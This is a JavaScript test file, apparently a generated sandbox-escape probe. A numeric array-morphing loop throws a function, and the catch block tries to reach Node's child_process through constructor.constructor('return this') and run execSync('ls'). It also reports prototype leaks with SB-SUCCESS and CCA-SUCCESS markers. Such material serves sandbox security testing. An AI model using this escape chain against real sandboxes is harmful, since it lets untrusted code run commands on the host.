try {
    var loops = 15;
    var nx = 120;
    var nz = 120;
    function morph(a, f) {
        throw () => {
            return () => {
            };
        };
        var PI2nx = Math.PI * 8 / nx;
        var sin = Math.sin;
        var f30 = -(50 * sin(f * Math.PI * 2));
        for (var i = 0; i < nz; ++i) {
            for (var j = 0; j < nx; ++j) {
                a[3 * (i * nx + j) + 1] = sin((j - 1) * PI2nx) * -f30;
            }
        }
    }
    var a = Array();
    for (var i = 0; i < nx * nz * 3; ++i)
        a[i] = 0;
    for (var i = 0; i < loops; ++i) {
        morph(a, i / loops);
    }
    testOutput = 0;
    for (var i = 0; i < nx; i++)
        testOutput += a[3 * (i * nx + i) + 1];
    a = null;
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}